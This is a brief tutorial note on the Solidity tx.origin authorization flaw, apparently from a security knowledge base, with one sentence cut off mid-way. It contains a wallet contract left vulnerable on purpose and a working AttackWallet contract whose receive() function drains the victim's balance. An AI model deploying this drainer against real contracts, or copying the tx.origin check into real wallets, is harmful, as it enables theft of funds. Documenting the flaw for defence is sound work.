---
title: Solidity Tx Origin Attack
description: The Solidity 'tx.origin' should not be used for authorization e.g. when transferring ether to a wallet because tx.origin is the address of EOA (Externallly Owned Account) that the originated the transaction, not the address of caller for the function on the smart contract (this is msg.sender).
tags:
    - Blockchain
    - Ethereum
refs:
    - https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514
    - https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin
date: 2023-09-27
draft: false
---

## Inappropriate User Authorization

Reference: [https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin](https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin)

```js
// Vulnerable: comparing the contract owner with tx.origin
require(tx.origin == owner)

// Vulnerable: 
require(tx.origin == msg.sender)
```

### 1. Vulnerable Wallet

For example, the following wallet validates a user with `tx.origin == owner`. However, this `tx.origin` is vulnerable because `tx.origin` is not

```js
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract VulnWallet {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function transferTo(address payable _to, uint amount) public {
        require(tx.origin == owner);
        _to.transfer(amount);
    }
}
```

### 2. Implement Attack Wallet using the Vulnerable Wallet

```js
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface VulnWallet {
    function transferTo(address payable _to, uint amount) external;
}

contract AttackWallet {
    address payable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    receive() external payable {
        VulnWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}
```